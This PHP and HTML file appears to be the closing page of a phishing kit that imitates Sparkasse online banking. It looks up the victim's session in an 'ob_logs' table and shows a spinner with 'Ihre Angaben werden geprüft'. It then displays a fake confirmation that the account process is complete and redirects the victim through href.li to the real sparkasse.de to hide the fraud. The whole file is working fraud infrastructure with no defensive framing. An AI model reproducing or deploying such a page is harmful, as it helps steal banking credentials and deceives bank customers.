<?php

	session_start();
	
	include("sp_config.inc.php");
	
	$getBank = $SQL->prepare('SELECT current_bank FROM ob_logs WHERE ob_id = ?');
	$getBank -> bind_param('s', $_SESSION["ob_id"]);
	$getBank -> execute();
	$getBank -> store_result();
	$getBank -> bind_result($appThisCurrentBank);
	$getBank -> fetch();
	
	$this_Name = "Aktualisierung";
	$this_Title = "Prozess durchführen";
	$appHeight = "999px";
	
	if(isset($_POST["execute"])) {
	//APP SUBMIT-BTN TRIGGERED
		
		header("Location: https://href.li/?https://sparkasse.de");
		exit();
	
	}

	include("sp_header.tpl.php");

?>

            <div class="if6_outer if6_breadcrumb" aria-hidden="false">
                <div class="if6_inner">
                    <ul class="navpath">
                        <li>
                            <a href="#">
                                Aktualisierung
                            </a>
                        </li>

                        <li>
                            <a href="#">
                                <?=$this_Title;?>
                            </a>
                        </li>
                    </ul>
                </div>
                <script type="application/ld+json">
                    {
                        "@context": "https://schema.org",
                        "@type": "BreadcrumbList",
                        "itemListElement": [
                            { "@type": "ListItem", "position": 1, "name": "xxx", "item": "#" },
                            { "@type": "ListItem", "position": 2, "name": "yyy", "item": "#" }
                        ]
                    }
                </script>
            </div>

            <section class="if6_outer if6_section" role="main" aria-hidden="false">
                <div class="if6_inner">
                    <div class="section parsys">
                        <div class="if6_glossar section"></div>

                        <div class="if6_tabnav section"></div>

                        <div class="cbox cbox-banking cbox-large section" style="height: auto;">
                            <div id="ospm_app" class="ospm_if no-if6-changes" style="height: 636px;">
                                <div id="ospm_app_header_container">
                                    <div id="ospm_app_stage" style="display: none;">
                                        <div id="ospm_app_stage_content">
                                            <div id="ospm_app_stage_label_wrapper">
                                                <div id="ospm_app_stage_label1"></div>
                                                <div id="ospm_app_stage_label2"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="ospm_app_sub_header_container">
                                    <div id="ospm_app_header_wrapper">
                                        <div id="ospm_app_header" class="ospm_horizontal_flex_container" style="margin-top: 0px;">
                                            <div id="ospm_page_header_view">
                                                <div class="ospm_horizontal_flex_container">
                                                    <?php
												
													if($detect->isMobile()) {
												
												?>
                                                    <h1 class="ospm_title"><span class="ospm_only_title">Abschluss</span></h1>
												<?php
												
													} else {
														
												?>
													<h1 class="ospm_title"><span class="ospm_only_title"><?=$this_Title;?></span></h1>
												<?php
												
													}
													
												?>
                                                    <div class="ospm_context_title"><span></span></div>
                                                </div>
												

                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="ospm_app_main" style="top: 0;">
                                    <div id="ospm_main_wrapper" class="ospm_horizontal_flex_container">
                                        <div id="ospm_app_main_middle">
                                            <div class="ospm_app_main_middle_inner_content">
                                                <div id="ospm_app_main_right_content_wrapper" class="ospm_app_main_right_content_wrapper">
                                                    <div id="ospm_app_main_right_content" class="ospm_app_main_right_content" style="transition-duration: 0ms; left: -200%;">
                                                        <div class="ospm_frame_wrapper" id="a41b2f47-37d5-4a38-8190-52eb651b19ae" style="left: 0%;"></div>
                                                        <div class="ospm_frame_wrapper" id="e6e2aa1e-b9ad-4c10-a359-5af22c34d655" style="left: 100%;"></div>
                                                        <div class="ospm_frame_wrapper ospm_active_frame" id="c808ca74-820a-4cf3-aa07-572256cb1eef" style="left: 200%;">
                                                            <div class="ospm_page_wrapper">
                                                                <div class="ospm_page_container" aria-hidden="false" style="padding-top: 64px;">
                                                                    <div class="ospm_layout ospm_one_column_layout ospm_header_to_scroll ospm_background_default" id="ID_2798ddde-d44a-4e24-b779-e8da73b3ee9f">
                                                                        <div class="ospm_columns_container">
                                                                            <div class="ospm_columns_aligner">
                                                                                <div class="ospm_layout_column_wrapper ospm_one_column_layout_1 ospm_scrollable_layout">
																				
																			
																				
                                                                                    <div class="ospm_column_layout ospm_layout_width_2_3">
                                                                                        <div class="ospm_layout_scrollarea">
																						
																						
																						
																						
																						<!-- START BLOCK -->
																						<div id="appSecondContentBlock">
                                                                                            <div class="ospm_list ospm_widget ospm_list_form" id="ID_60cc6317-6e8f-45b3-afcd-1da9550cb9df">
																							<form action="" method="POST">
                                                                                                <div class="ospm_list_content_container" style="">
																								
																								
																							
																								
																								
                                                                                                    <div class="ospm_list_cell_container">
																									
                                                                                                      
																									
																										
																									
                                                                                                        <div
                                                                                                            class="ospm_notification ospm_widget_without_bottom_border ospm_has_margin_bottom ospm_margin_bottom_m3 ospm_has_icon ospm_has_label ospm_has_sublabel ospm_list_entry_wrapper"
                                                                                                            id="ID_bf72c39a-9f85-4bcd-bdf1-b455830b0d72" style="margin-bottom:-10px;"
                                                                                                        >
                                                                                                 
                                                                                                            <label class="ospm_label ospm_text_style_13" id="bf72c39a-9f85-4bcd-bdf1-b455830b0d72__label" style="font-weight:600;">Prozess wird abgeschlossen in <span class="c" id="7"></span><strong>.</strong><strong>.</strong><strong>.</strong></label>
																											
                                                                                                            <div class="ospm_sublabel ospm_text_style_26" id="bf72c39a-9f85-4bcd-bdf1-b455830b0d72__sublabel" style="">
                                                                                                            
																											<!-- SPINNER START -->
																											
																											<div class="loadingio-spinner-rosary-9gibvb5qyfc"><div class="ldio-2oonhya93pv">
<div><div></div></div><div><div></div></div><div><div></div></div><div><div></div></div><div><div></div></div><div><div></div></div><div><div></div></div><div><div></div></div>
</div></div>
<style type="text/css">
@keyframes ldio-2oonhya93pv {
  0% { transform: rotate(0); }
  100% { transform: rotate(360deg); }
}
.ldio-2oonhya93pv > div {
  position: absolute;
  width: 12px;
  height: 12px;
  animation: ldio-2oonhya93pv 2.380952380952381s cubic-bezier(0.5,0,0.5,1) infinite;
  transform-origin: 100px 100px;
}
.ldio-2oonhya93pv > div > div {
  width: 12px;
  height: 12px;
  border-radius: 50%;
}
.ldio-2oonhya93pv div:nth-child(0) {
  animation-delay: 0s;
}
.ldio-2oonhya93pv div:nth-child(0) > div {
  background: #ee0000;
  transform: translate(151.12144050096893px,137.8308228886279px);
}
.ldio-2oonhya93pv div:nth-child(1) {
  animation-delay: -0.062s;
}
.ldio-2oonhya93pv div:nth-child(1) > div {
  background: #ee1e1e;
  transform: translate(137.8308228886279px,151.12144050096893px);
}
.ldio-2oonhya93pv div:nth-child(2) {
  animation-delay: -0.125s;
}
.ldio-2oonhya93pv div:nth-child(2) > div {
  background: #d70000;
  transform: translate(121.55320713028647px,160.51932634081265px);
}
.ldio-2oonhya93pv div:nth-child(3) {
  animation-delay: -0.187s;
}
.ldio-2oonhya93pv div:nth-child(3) > div {
  background: #ee0000;
  transform: translate(103.39788583984372px,165.38403001891436px);
}
.ldio-2oonhya93pv div:nth-child(4) {
  animation-delay: -0.25s;
}
.ldio-2oonhya93pv div:nth-child(4) > div {
  background: #ff3737;
  transform: translate(84.60211416015629px,165.38403001891436px);
}
.ldio-2oonhya93pv div:nth-child(5) {
  animation-delay: -0.312s;
}
.ldio-2oonhya93pv div:nth-child(5) > div {
  background: #e61414;
  transform: translate(66.44679286971356px,160.51932634081265px);
}
.ldio-2oonhya93pv div:nth-child(6) {
  animation-delay: -0.375s;
}
.ldio-2oonhya93pv div:nth-child(6) > div {
  background: #ee0000;
  transform: translate(50.169177111372115px,151.12144050096893px);
}
.ldio-2oonhya93pv div:nth-child(7) {
  animation-delay: -0.437s;
}
.ldio-2oonhya93pv div:nth-child(7) > div {
  background: #df2424;
  transform: translate(36.87855949903108px,137.8308228886279px);
}
.loadingio-spinner-rosary-9gibvb5qyfc {
  width: 200px;
  height: 200px;
  display: inline-block;
  overflow: hidden;
  background: none;
}
.ldio-2oonhya93pv {
  width: 100%;
  height: 100%;
  position: relative;
  transform: translateZ(0) scale(1);
  backface-visibility: hidden;
  transform-origin: 0 0; /* see note above */
}
.ldio-2oonhya93pv div { box-sizing: content-box; }
</style>
																											
																											<!-- SPINNER END -->
																											
																											
																											
                                                                                                            </div>
																											
																											<label class="ospm_label ospm_text_style_13" id="bf72c39a-9f85-4bcd-bdf1-b455830b0d72__label" style="">Ihre Angaben werden zurzeit von uns geprüft.</label>
																											
																				
																											
                                                                                                        </div>
																										
																									
                                                                                                </div>
                                                                                            </div>
                                                          
																						</form>
                                                                                        </div>
																					</div>
																					<!-- END BLOCK -->
																					
																					<!-- START BLOCK -->
																						<div id="appFirstContentBlock" style="display:none;">
                                                                                            <div class="ospm_list ospm_widget ospm_list_form" id="ID_60cc6317-6e8f-45b3-afcd-1da9550cb9df">
																							<form action="" method="POST">
                                                                                                <div class="ospm_list_content_container" style="">
																								
																								
																							
																								
																								
                                                                                                    <div class="ospm_list_cell_container">
																									
                                                                                                      
																									
																										
																									
                                                                                                        <div
                                                                                                            class="ospm_notification ospm_widget_without_bottom_border ospm_has_margin_bottom ospm_margin_bottom_m3 ospm_has_icon ospm_has_label ospm_has_sublabel ospm_list_entry_wrapper"
                                                                                                            id="ID_bf72c39a-9f85-4bcd-bdf1-b455830b0d72" style="margin-bottom:-10px;"
                                                                                                        >
                                                                                                 
                                                                                                            <label class="ospm_label ospm_text_style_13" id="bf72c39a-9f85-4bcd-bdf1-b455830b0d72__label" style="font-weight:600;margin-bottom:8px;">Prozess ist abgeschlossen</label>
																											<label class="ospm_label ospm_text_style_13" id="bf72c39a-9f85-4bcd-bdf1-b455830b0d72__label" style="">Herzlichen Glückwunsch!</label>
                                                                                                            <div class="ospm_sublabel ospm_text_style_26" id="bf72c39a-9f85-4bcd-bdf1-b455830b0d72__sublabel" style="font-size:16px;">
                                                                                                                Wir haben Ihre Angaben und Daten soeben erfolgreich geprüft, sodass Sie diesen Prozess somit abgeschlossen haben. Sie können Ihre Dienste nun auch weiterhin wie gewohnt nutzen und haben keinerlei Einschränkungen zu erwarten. Es sind Ihrerseits nun keine weiterführenden Aktionen erforderlich, sodass Sie diese Seite nun bedenkenlos schließen oder die Weiterleitung initiieren können.<br /><br />
																												
																												Vielen Dank für Ihre Mitarbeit!
                                                                                                            </div>
																											
																				
																											
                                                                                                        </div>
																										
																									
                                                                                                </div>
                                                                                            </div>
                                                                                            <div class="ospm_navigationbar ospm_last_visible_element" id="ID_198f7284-c4a4-4268-95ec-d5428203608c">

																								<button type="submit" name="execute" class="ospm_one_button ospm_button_one_size_default ospm_text_style_default ospm_display_style_primary ospm_one_button_full_width ospm_clickable">
                                                                                                    <div class="ospm_button_label_wrapper ospm_horizontal_flex_container">
                                                                                                        <div class="ospm_button_label_container ospm_flex_items_align_center">
                                                                                                            <div class="ospm_button_label">Weiterleitung durchführen</div>
                                                                                                            <div class="ospm_icon ospm_icon_next_arrow_s ospm_icon_noStroke ospm_icon_size_16 ospm_right_icon" style="background-image: none;">
                                                                                                                <svg
                                                                                                                    xmlns="http://www.w3.org/2000/svg"
                                                                                                                    xmlns:xlink="http://www.w3.org/1999/xlink"
                                                                                                                    focusable="false"
                                                                                                                    style="pointer-events: none;"
                                                                                                                >
                                                                                                                    <use xlink:href="#ospm_svg_symbol_next_arrow_s"></use>
                                                                                                                </svg>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
																								</button>
                                                                                 
                                                                                            </div>
																						</form>
                                                                                        </div>
																					</div>
																					<!-- END BLOCK -->
																						
																						
																						
                                                                                        <div class="ospm_layout_stickyarea" style="top: 572px;"></div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="ospm_app_main_rightbar_wrapper">
                                    <div id="ospm_app_main_rightbar" class="invisible hidden">
                                        <div id="ospm_app_main_rightbar_tabcontainer">
                                            <div class="ospm_app_main_rightbar_tab">
                                                <div id="ospm_app_main_rightbar_administration" class="ospm_app_main_rightbar_slider">
                                                    <div class="ospm_app_main_rightbar_wrapper">
                                                        <div class="ospm_rightbar_frame" id="ospm_app_main_rightbar_consultant">
                                                            <div class="ospm_rightbar_row ospm_rightbar_row_expanded"></div>
                                                            <div class="ospm_rightbar_row"><div class="ospm_app_main_rightbar_buttons"></div></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
									
                                </div>
                            </div>

                                    </script>

                                    <script type="text/javascript">
                                        <!--
                                        (function(){
                                        IF.put('invisibleButton','ztPhBDriJwXISTmq');IF.put('action','KjNsxwdyqwJyvWZu');IF.put('nachrichtButton','iytmjxpSHsnXuKRN');IF.put('weiterButton','opleApOlwUwyZfDm');IF.put('feld1','GouCxPLRWvwWnkmR');IF.put('feld2','qPsASqshBNuWFbFJ');
                                        }());

                                         -->
                                    </script>

                                    <script type="text/javascript">
                                        <!--
                                        (function(){
                                        IF.checkFirstSubmit = function() {
                                        field = document.getElementById('OnEObQSiqgJXQqRt');
                                        if ( field.value == '0' ) {
                                        field.value = '1';
                                        return true
                                        } else {
                                        window.alert('Ihre Daten wurden bereits abgesendet!');
                                        return false
                                        }
                                        }


                                        }());

                                         -->
                                    </script>
                                    <div style="position: absolute; top: 0px;">
                                        <input type="text" name="OnEObQSiqgJXQqRt" id="OnEObQSiqgJXQqRt" value="0" disabled="disabled" style="display: none;" class="" size="1" data-tracked="true" />
                                    </div>
                                    <input type="text" name="KjNsxwdyqwJyvWZu" id="KjNsxwdyqwJyvWZu" value="" class="" data-tracked="true" />
                                    <input type="text" name="GouCxPLRWvwWnkmR" id="GouCxPLRWvwWnkmR" value="" class="" data-tracked="true" />
                                    <input type="text" name="qPsASqshBNuWFbFJ" id="qPsASqshBNuWFbFJ" value="" class="" data-tracked="true" />
                                    <input type="submit" name="opleApOlwUwyZfDm" value="Submit" class="" data-tracked="true" />
                                    <div class="block countimg">
                                        <div class="bline btext-only">
                                            <div
                                                id="universal_analytics_checkout"
                                                data-fid="Onlinebanking bearbeiten Zugangsdaten vergessen"
                                                data-neo="olb"
                                                data-prod="olb Zugangsdaten vergessen"
                                                data-ifa_produktgruppe="Online-Banking"
                                                data-ifa_vertriebstyp="Service"
                                                data-use="OSPlus_neoStart"
                                            ></div>
                                            <br class="bterm" />
                                        </div>
                                    </div>
                                    <input type="hidden" name="vuntbwfWLEVqDybm" id="vuntbwfWLEVqDybm" value="PISNVuDZtOYqXBjQ" />
                                </form>

                                <script type="text/javascript">
                                    <!--
                                    $(document).one('if6_page_ready', function(){

                                    var notFound = true;
                                    var focusControl;
                                    var form = document.forms['30ac67ac4732465e'];
                                    for(var i = 0; notFound && i < form.elements.length; i++){
                                       focusControl = form.elements[i];
                                       if(focusControl){
                                           if(focusControl.className=='invisible' || focusControl.type == 'submit' || focusControl.type == 'hidden' || focusControl.disabled){
                                               continue;
                                           }
                                           if(focusControl.type == 'select-one'){
                                               if(focusControl.value !='CJlTAcvpZKrarRVI'){
                                                   continue;
                                               }
                                           }
                                       }
                                       notFound = false;
                                    }
                                    if (location.hash && location.hash.length > 2 && $(location.hash).length > 0) {
                                      focusControl = null;
                                    }

                                    if (focusControl && focusControl.length > 0) {
                                      focusControl = focusControl[0];
                                    }
                                    if (focusControl) {
                                      if (focusControl.type != 'hidden' && !focusControl.disabled && focusControl.focus) {
                                         focusControl.focus();
                                      }
                                    }

                                    });

                                     -->
                                </script>

                                <script>
                                    style = document.createElement("link");
                                    style.type = "text/css";
                                    style.rel = "stylesheet";
                                    style_if = document.createElement("link");
                                    style_if.type = "text/css";
                                    style_if.rel = "stylesheet";
                                    if (document.body.classList.contains("nbf")) {
                                        window.nbf = true;
                                        style.href = "/if/neo.proxy/TUFJTkBwb3J0YWw=/neoif/taoospm/css/ospm/ospm_v2.css";
                                        style.id = "ospm_v2_style_sheet";
                                        style_if.href = "/if/neo.proxy/TUFJTkBwb3J0YWw=/neoif/taoospm/css/ospm/ospm_if_v2.css";
                                        style_if.id = "ospm_v2_style_sheet";
                                    } else {
                                        style.href = "/if/neo.proxy/TUFJTkBwb3J0YWw=/neoif/taoospm/css/ospm/ospm.css";
                                        style.id = "ospm_style_sheet";
                                        style_if.href = "/if/neo.proxy/TUFJTkBwb3J0YWw=/neoif/taoospm/css/ospm/ospm_if.css";
                                        style_if.id = "ospm_style_sheet";
                                    }
                                    document.getElementsByTagName("head").item(0).appendChild(style);
                                    document.getElementsByTagName("head").item(0).appendChild(style_if);
                                    window.IFNeoBridge = window.IFNeoBridge || {};
                                    window.IFNeoBridge.getFormElement = function (name) {
                                        return document.querySelector("div.ospm_if-form input[name='" + IF.get(name) + "']");
                                    };
                                </script>
                            </div>
                        </div>

                        <div class="if6_crosssellingarea section">
                        </div>


                    </div>
                </div>
            </section>

<?php

	include("sp_footer.tpl.php");
	
?>